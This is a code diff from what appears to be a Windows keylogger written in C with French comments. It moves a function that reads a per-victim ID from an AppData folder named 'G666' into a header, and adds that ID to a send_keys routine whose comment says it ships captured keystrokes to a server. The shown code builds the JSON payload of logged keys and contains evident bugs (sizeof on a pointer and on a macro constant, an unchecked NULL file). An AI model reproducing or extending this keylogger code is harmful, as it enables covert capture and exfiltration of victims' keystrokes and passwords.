@@ -3,36 +3,13 @@
 #include <time.h> 
 #include <stdlib.h>
 #include "../include/structures.h"
+#include "../include/uid.h"
 //#include "http.h"
 
 #define MAX_KEYS 100
 
 char key_log[MAX_KEYS*10];
 int current_key_log_size = 0;
-
-
-void get_uid(char *uid){
-    COMPUTER_INFOS computer;
-    get_computer_info(&computer);
-
-    char softwareDataDirectory[1024];
-    snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);
-    char *filename = "user";
-    char uid_file_path[500];
-    snprintf(uid_file_path, 500 , "%s\\%s", softwareDataDirectory, filename);
-
-    FILE *file = fopen(uid_file_path, "r");
-    if (file == NULL) {
-        perror("Erreur à l'ouverture du fichier en lecture");
-    }
-
-    char buffer[256];
-    fgets(buffer, sizeof(buffer), file);
-
-    snprintf(uid, sizeof(uid), "%s", buffer);
-    fclose(file);
-}
-
 
 
 void key_code_to_string(int key, char *string_key, int value_in_string_key){
@@ -147,7 +124,9 @@ void key_code_to_string(int key, char *string_key, int value_in_string_key){
 void send_keys(void){
 
     /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
-    
+    char uid[30]; 
+    get_uid(uid);
+
     char data[MAX_KEYS+50];
     snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
     memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
